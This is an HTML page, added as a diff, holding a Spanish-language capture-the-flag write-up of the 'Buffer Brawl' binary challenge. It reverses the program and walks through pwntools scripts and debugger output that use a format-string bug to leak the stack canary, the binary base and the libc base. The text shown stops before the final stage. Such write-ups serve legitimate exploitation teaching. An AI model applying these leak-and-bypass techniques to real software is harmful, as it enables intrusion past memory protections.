@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup World Wide Buffer Brawl</title>
+
+  <meta name="description" content="Resolución del reto Buffer Brawl del CTF de World Wide">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup World Wide Buffer Brawl">
+  <meta name="twitter:description" content="Resolución del reto Buffer Brawl del CTF de World Wide">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/worldwide.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup World Wide Buffer Brawl">
+  <meta property="og:description" content="Resolución del reto Buffer Brawl del CTF de World Wide">
+  <meta property="og:image" content="/images/otros/worldwide.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/worldwide.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup World Wide Buffer Brawl" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">World Wide</h4>
+    <picture><img src="/images/otros/worldwide.png" style="float: right; margin-right:0px; margin-left:0px; height:100px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Buffer Brawl</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/BufferBrawl/buffer_brawl.zip">binario</a> nos muestra un menú con varias opciones que analizaremos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./buffer_brawl</span><span class="p">
+
+        |||||||||
+        | _   _ |      
+       (  ' _ '  )
+        |  ___  |
+         |_____|                   
+  _______/     \_______         
+ /                     \          
+|   |\             /|   |
+|   ||  .       .  ||   |     
+|   / \           / \   |
+\  |   | |_ | _| |   |  /     
+|==|   | |_ | _| |   |==|
+/  /_ _|_|__|__|_|_ _\  \ 
+|___| /            \|___|
+      |     |      |
+      |     |      |
+      |     |      |
+      |     |      |
+      ''|''|''|''|''           
+        |  |  |  |   
+        |  |  |  |   
+       /   )  (   \ 
+      Ooooo    ooooO
+
+Ladies and gentlemen...
+Are you ready? For the main event of the CTF?
+Introducing...
+A challenge that packs a punch, tests your mettle, and overflows with excitement!  
+Let's get ready to buffeeeeeeeer!!!
+
+Choose:
+1. Throw a jab
+2. Throw a hook
+3. Throw an uppercut
+4. Slip
+5. Call off
+></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Analizaremos el funcionamiento del programa asi que iniciamos desensamblando la función <code class="language-plaintext highlighter-rouge">main</code>, esta llama a un par de funciones, la última de ellas es <code class="language-plaintext highlighter-rouge">menu</code></p>
+<a href="/challenges/bufferbrawl/1.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/1.png"></p></div></a>
+
+<p class="plain-text">La función menu inicia guardando una string en el stack y estableciendo una variable option <code class="language-plaintext highlighter-rouge">choice</code> la cual decidirá a que función llamar a través de una estructura <code class="language-plaintext highlighter-rouge">switch</code></p>
+<a href="/challenges/bufferbrawl/2.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/2.png"></p></div></a>
+
+<p class="plain-text">El siguiente bloque muestra poco a poco la string que muestra las opciones y recibe un entero con <code class="language-plaintext highlighter-rouge">scanf</code> que como formato recibe <code class="language-plaintext highlighter-rouge">%d</code> indicando un decimal</p>
+<a href="/challenges/bufferbrawl/3.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/3.png"></p></div></a>
+
+<p class="plain-text">En el caso por defecto o <code class="language-plaintext highlighter-rouge">0</code> muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> indicando que no es una opción válida y vuelve al inicio de la función <code class="language-plaintext highlighter-rouge">main</code> para recibir nuevamente el digito</p>
+<a href="/challenges/bufferbrawl/4.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/4.png"></p></div></a>
+
+<p class="plain-text">Si no salta al bloque <code class="language-plaintext highlighter-rouge">0</code> por defecto elige a que bloque saltar a través de un <code class="language-plaintext highlighter-rouge">switch</code></p>
+<a href="/challenges/bufferbrawl/5.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/5.png"></p></div></a>
+
+<p class="plain-text">El caso <code class="language-plaintext highlighter-rouge">1</code> llama a la función <code class="language-plaintext highlighter-rouge">jab</code>, esta resta una unidad a la variable global llamada <code class="language-plaintext highlighter-rouge">stack_life_points</code> y salta a la función <code class="language-plaintext highlighter-rouge">stack_check_up</code> que luego analizaremos</p>
+<a href="/challenges/bufferbrawl/6.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/6.png"></p></div></a>
+<a href="/challenges/bufferbrawl/7.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/7.png"></p></div></a>
+
+<p class="plain-text">El caso <code class="language-plaintext highlighter-rouge">2</code> llama a <code class="language-plaintext highlighter-rouge">hook</code> que hace lo mismo pero resta <code class="language-plaintext highlighter-rouge">2</code> unidades en lugar de una</p>
+<a href="/challenges/bufferbrawl/8.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/8.png"></p></div></a>
+<a href="/challenges/bufferbrawl/9.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/9.png"></p></div></a>
+
+<p class="plain-text">Finalmente el caso <code class="language-plaintext highlighter-rouge">3</code> llama a la función <code class="language-plaintext highlighter-rouge">uppercut</code> que resta un total de <code class="language-plaintext highlighter-rouge">3</code> unidades</p>
+<a href="/challenges/bufferbrawl/10.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/10.png"></p></div></a>
+<a href="/challenges/bufferbrawl/11.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/11.png"></p></div></a>
+
+<p class="plain-text">Cada una de las funciones termina con un <code class="language-plaintext highlighter-rouge">jmp</code> hacia la función <code class="language-plaintext highlighter-rouge">status_check_up</code>, ésta función al inicio compara la variable global <code class="language-plaintext highlighter-rouge">stack_life_points</code> con la constante <code class="language-plaintext highlighter-rouge">13</code></p>
+<a href="/challenges/bufferbrawl/12.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/12.png"></p></div></a>
+
+<p class="plain-text">Si la variable tiene un valor mayor o igual a <code class="language-plaintext highlighter-rouge">0</code> lanza un mensaje llamando a la función <code class="language-plaintext highlighter-rouge">printf</code> que muestra los puntos totales en la variable y sigue con la ejecución normal</p>
+<a href="/challenges/bufferbrawl/13.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/13.png"></p></div></a>
+
+<p class="plain-text">Si la comparación de la variable global contra la constante <code class="language-plaintext highlighter-rouge">13</code> puntos resulta exitosa muestra un prompt con <code class="language-plaintext highlighter-rouge">puts</code> y recibe una string con <code class="language-plaintext highlighter-rouge">scanf</code> que lo guarda en el segundo argumento al que le pasa el valor de <code class="language-plaintext highlighter-rouge">rsp</code>, entendemos que escribirá en el stack, luego de la ejecución mueve el <code class="language-plaintext highlighter-rouge">rsp</code> un total de <code class="language-plaintext highlighter-rouge">0x28</code> o <code class="language-plaintext highlighter-rouge">40</code> bytes más adelante, aqui tenemos un posible buffer overflow, el offset al return address es <code class="language-plaintext highlighter-rouge">40</code> pero la stack cookie está en <code class="language-plaintext highlighter-rouge">rbp - 8</code> y el offset para llegar ahí son <code class="language-plaintext highlighter-rouge">24</code> bytes</p>
+<a href="/challenges/bufferbrawl/14.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/14.png"></p></div></a>
+
+<p class="plain-text">Volvemos a la estructura <code class="language-plaintext highlighter-rouge">switch</code>, el caso <code class="language-plaintext highlighter-rouge">4</code> llama a <code class="language-plaintext highlighter-rouge">slip</code> lee un total de <code class="language-plaintext highlighter-rouge">0x1d</code> bytes con <code class="language-plaintext highlighter-rouge">read</code> y lo guarda en el <code class="language-plaintext highlighter-rouge">rsp</code>, luego le pasa eso como único argumento a <code class="language-plaintext highlighter-rouge">printf</code> sin pasarle algún tipo de formato ocasionando una vulnerabilidad de format string</p>
+<a href="/challenges/bufferbrawl/15.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/15.png"></p></div></a>
+
+<a href="/challenges/bufferbrawl/16.png" target="_blank"><div><p><img src="/challenges/bufferbrawl/16.png"></p></div></a>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, empezamos con el <code class="language-plaintext highlighter-rouge">FULL RELRO</code> nos impode escribir en la tabla <code class="language-plaintext highlighter-rouge">got</code>, el <code class="language-plaintext highlighter-rouge">Canary</code> establece una variable local en <code class="language-plaintext highlighter-rouge">rbp - 8</code> que comprueba que no se haya modificado antes de retornar, el <code class="language-plaintext highlighter-rouge">NX</code> nos impide ejecutar shellcode en el stack y el <code class="language-plaintext highlighter-rouge">PIE</code> hace aleatoria la dirección base del binario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> buffer_brawl
+[</span><span class="az">*</span><span class="p">] '/home/user/buffer_brawl'
+    Arch:       amd64-64-little  
+    RELRO:      </span><span class="ve">Full RELRO</span><span class="p">
+    Stack:      </span><span class="ve">Canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ve">PIE enabled</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que en el caso <code class="language-plaintext highlighter-rouge">4</code> tenemos un format string, podemos probar enviar varios <code class="language-plaintext highlighter-rouge">%p</code> separados por <code class="language-plaintext highlighter-rouge">.</code> y el resultado son leaks de múltiples punteros interesantes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">> 4
+
+Try to slip...
+Right or left?
+%p.%p.%p.%p.%p.%p.%p
+0x7ffc899d9390.0x1d.0x7e973e3147e2.0x1e.(nil).0x70252e70252e7025.0x252e70252e70252e  
+Choose:
+1. Throw a jab
+2. Throw a hook
+3. Throw an uppercut  
+4. Slip
+5. Call off</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El siguiente script en python itera sobre las posiciones del <code class="language-plaintext highlighter-rouge">1</code> al <code class="language-plaintext highlighter-rouge">15</code> y muestra los punteros filtrados para ver si alguno de ellos nos puede servir para la explotación</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./buffer_brawl"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi"> 15</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="no">f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$p"</span><span class="p">.encode())  
+
+    leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().decode()
+
+    log.info(</span><span class="no">f</span><span class="s">"</span><span class="p">{i}</span><span class="s">: </span><span class="p">{leak}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo de primeras llama la atención la posición <code class="language-plaintext highlighter-rouge">11</code> ya que son <code class="language-plaintext highlighter-rouge">8</code> bytes completos y el último es un <code class="language-plaintext highlighter-rouge">00</code>, formato tipico de las stack cookies o <code class="language-plaintext highlighter-rouge">canary</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 33778
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './buffer_brawl']  
+[</span><span class="az">*</span><span class="p">] 1: 0x7fff21c92580
+[</span><span class="az">*</span><span class="p">] 2: 0x1d
+[</span><span class="az">*</span><span class="p">] 3: 0x7922b91147e2
+[</span><span class="az">*</span><span class="p">] 4: 0x1e
+[</span><span class="az">*</span><span class="p">] 5: (nil)
+[</span><span class="az">*</span><span class="p">] 6: 0x5a0a70243625
+[</span><span class="az">*</span><span class="p">] 7: 0xa
+[</span><span class="az">*</span><span class="p">] 8: 0x5a007b8e24e0
+[</span><span class="az">*</span><span class="p">] 9: 0x5a007b8e2181
+[</span><span class="az">*</span><span class="p">] 10: 0x5a007b8e2171
+[</span><span class="az">*</span><span class="p">] 11: 0x4c2cdd8b3ad7ff00
+[</span><span class="az">*</span><span class="p">] 12: 0x5a007b8e24e0
+[</span><span class="az">*</span><span class="p">] 13: 0x5a007b8e1747
+[</span><span class="az">*</span><span class="p">] 14: 0x24
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+Choose:
+1. Throw a jab
+2. Throw a hook
+3. Throw an uppercut
+4. Slip
+5. Call off
+> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La posición <code class="language-plaintext highlighter-rouge">13</code> apunta a la función <code class="language-plaintext highlighter-rouge">menu + 215</code>, esta dirección es parte del binario y si restamos el offset que son <code class="language-plaintext highlighter-rouge">0x1747</code> bytes deberiamos poder obtener la dirección base</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007922b91147e2 </span><span class="p">in </span><span class="am">read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6
+</span><span class="ro">pwndbg></span><span class="p"> x/i 0x5a007b8e1747
+   </span><span class="az">0x5a007b8e1747</span><span class="p"> &lt</span><span class="am">menu</span><span class="p">+215>:</span><span class="ve">	jmp</span><span class="az">    0x5a007b8e16c0</span><span class="p"> &lt</span><span class="am">menu</span><span class="p">+80>
+</span><span class="ro">pwndbg></span><span class="p"> vmmap 0x5a007b8e1747
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+    0x5a007b8e0000     0x5a007b8e1000 r--p     1000      0 /home/user/buffer_brawl
+</span><span class="ro">►   0x5a007b8e1000     0x5a007b8e2000 r-xp     1000   1000 /home/user/buffer_brawl +0x747  </span><span class="p">
+    0x5a007b8e2000     0x5a007b8e3000 r--p     1000   2000 /home/user/buffer_brawl
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x5a007b8e1747 - 0x5a007b8e0000
+</span><span class="az">$1</span><span class="p"> = 0x1747
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, hacemos un leak con los punteros en la posición <code class="language-plaintext highlighter-rouge">11</code> y <code class="language-plaintext highlighter-rouge">13</code>, a éste último le restamos el offset y de esta forma obtenemos la stack cookie y la dirección base del binario, con esto ya evadimos 2 de las protecciones que son el <code class="language-plaintext highlighter-rouge">Canary</code> y el <code class="language-plaintext highlighter-rouge">PIE</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, log
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./buffer_brawl"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)  
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%11$p.%13$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">], </span><span class="mi">16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1747</span><span class="p">
+
+log.info(</span><span class="no">f</span><span class="s">"Canary:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(canary)}</span><span class="s">"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Binary base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo ejecutamos para comprobar que funciona, esto nos muestra la stack cookie y una dirección que si comparamos con la dirección base del binario es justo la misma</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 34169
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './buffer_brawl']  
+[</span><span class="az">*</span><span class="p">] Canary: 0x232f75b7c0f1b600
+[</span><span class="az">*</span><span class="p">] Binary base: 0x5c0474962000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+Choose:
+1. Throw a jab
+2. Throw a hook
+3. Throw an uppercut
+4. Slip
+5. Call off
+> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x000076e3605147e2 </span><span class="p">in</span><span class="am"> read</span><span class="p"> () from </span><span class="ve">./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap buffer_brawl
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+►   0x5c0474962000     0x5c0474963000 r--p     1000      0 /home/user/buffer_brawl
+</span><span class="ro">►   0x5c0474963000     0x5c0474964000 r-xp     1000   1000 /home/user/buffer_brawl</span><span class="p">
+►   0x5c0474964000     0x5c0474965000 r--p     1000   2000 /home/user/buffer_brawl
+►   0x5c0474965000     0x5c0474966000 r--p     1000   2000 /home/user/buffer_brawl
+</span><span class="sa">►   0x5c0474966000     0x5c0474967000 rw-p     1000   3000 /home/user/buffer_brawl  
+►   0x5c0474967000     0x5c0474969000 rw-p     2000   5000 /home/user/buffer_brawl  
+    </span><span class="az">0x5c0474d2c000     0x5c0474d4d000 rw-p    21000      0 [heap]
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al inicio cuando lekeamos algunos punteros podemos notar que a partir de la posición <code class="language-plaintext highlighter-rouge">6</code> los valores son un reflejo de nuestros datos en punteros hexadecimales</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unhex</span><span class="p"> 70252e70252e7025
+p%.p%.p%
+
+</span><span class="ve">❯ unhex</span><span class="p"> 252e70252e70252e
+%.p%.p%.%</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, podemos enviar <code class="language-plaintext highlighter-rouge">%7$p</code> para hacer un leak de la posición <code class="language-plaintext highlighter-rouge">7</code> y luego rellenar con <code class="language-plaintext highlighter-rouge">.</code> a <code class="language-plaintext highlighter-rouge">8</code> bytes que es el tamaño del puntero, luego enviamos <code class="language-plaintext highlighter-rouge">AAAABBBB</code>, el resultado es que el leak muestra estos caractéres de la posición <code class="language-plaintext highlighter-rouge">7</code> como puntero</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">> 4
+
+Try to slip...
+Right or left?
+%7$p....AAAABBBB
+0x4242424241414141....AAAABBBB  
+Choose:
+1. Throw a jab
+2. Throw a hook
+3. Throw an uppercut
+4. Slip
+5. Call off
+></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos aprovechar esto para hacer un leak de libc, para ello solo necesitamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">puts</code> que contiene una referencia a su posición en libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/i puts
+   </span><span class="az">0x1030</span><span class="p"> &lt</span><span class="am">puts@plt</span><span class="p">>:</span><span class="ve">    jmp</span><span class="p">    QWORD PTR [</span><span class="ro">rip</span><span class="p">+</span><span class="az">0x2f6a</span><span class="p">]</span><span class="c1">        # 0x3fa0 &ltputs@got.plt>  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">También necesitamos el offset ésta la misma función pero en libc que obtenemos con <code class="language-plaintext highlighter-rouge">libcdb</code>, esto para restarle esa cantidad al leak y obtener la dirección base de libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ libcdb</span><span class="p"> file libc.so.6
+[</span><span class="az">*</span><span class="p">] </span><span class="ro">libc.so.6</span><span class="p">
+    </span><span class="ve">Version:</span><span class="p">     2.35
+    </span><span class="ve">BuildID:</span><span class="p">     490fef8403240c91833978d494d39e537409b92e
+    </span><span class="ve">MD5:</span><span class="p">         3ffd733fd1e00b1f8ef939de78b33509
+    </span><span class="ve">SHA1:</span><span class="p">        b99cddb548877d514655da7ecac1348dd45e6eee
+    </span><span class="ve">SHA256:</span><span class="p">      5955dead1a55f545cf9cf34a40b2eb65deb84ea503ac467a266d061073315fa7  
+    </span><span class="ve">Symbols:</span><span class="p">
+        __libc_start_main_ret = 0x29d90
+                         dup2 = 0x115010
+                       printf = 0x606f0
+                         puts = 0x80e50
+                         read = 0x1147d0
+                   str_bin_sh = 0x1d8678
+                       system = 0x50d70
+                        write = 0x114870</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, ahora nuestro exploit usa <code class="language-plaintext highlighter-rouge">%7$s</code> para mostrar como string el contenido de la posición <code class="language-plaintext highlighter-rouge">7</code>, rellenamos el qword y para esa posición le pasamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">puts</code>, entonces ejecutará algún tipo de <code class="language-plaintext highlighter-rouge">printf(puts@got)</code> que muestra la dirección de <code class="language-plaintext highlighter-rouge">puts</code> en memoria y al restar el offset nos da la dirección base de libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64, log
+
+shell </span><span class="o">= </span><span class="p">gdb.debug(</span><span class="s">"./buffer_brawl"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%11$p.%13$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x1747</span><span class="p">
+
+payload</span><span class="o"> =</span><span class="p"> </span><span class="no">b</span><span class="s">"%7$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3fa0</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"...."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"\x00"</span><span class="p">))</span><span class="o"> -</span><span class="mi"> 0x80e50</span><span class="p">  
+log.info(</span><span class="no">f</span><span class="s">"Libc base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el exploit y nos muestra la dirección lekeada, si comparamos esta dirección con la base de libc que vemos en <code class="language-plaintext highlighter-rouge">gdb</code> es exactamente la misma</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 38069
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './buffer_brawl']  
